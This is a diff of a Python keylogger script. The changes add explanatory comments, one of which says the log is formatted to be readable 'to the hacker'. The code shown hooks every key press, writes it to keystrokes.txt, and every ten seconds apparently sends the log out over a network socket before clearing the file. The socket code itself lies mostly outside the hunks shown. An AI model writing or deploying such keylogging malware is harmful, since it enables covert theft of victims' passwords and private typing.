@@ -1,13 +1,13 @@
 import keyboard
 import asyncio
-import time
 import socket
 from cryptography.fernet import Fernet
 
 
 log_file = open('keystrokes.txt', 'w')
+# opens the file to write
 
-
+# essentially, this formats the text in a way that makes it readable to the hacker
 def on_key_press(event):
     if event.name == 'enter':
         log_file.write('\n')
@@ -26,6 +26,7 @@ def on_key_press(event):
         log_file.write(event.name)
     log_file.flush()
 
+# every ten seconds, do this following block of code:
 async def main():
     while True:
         await asyncio.sleep(10)
@@ -57,6 +58,7 @@ async def main():
         client_socket.close()
         log_file.truncate(0)
 
+# then, make an event listener, and run the main file chunk of code.
 keyboard.on_press(on_key_press)
 
 asyncio.run(main())
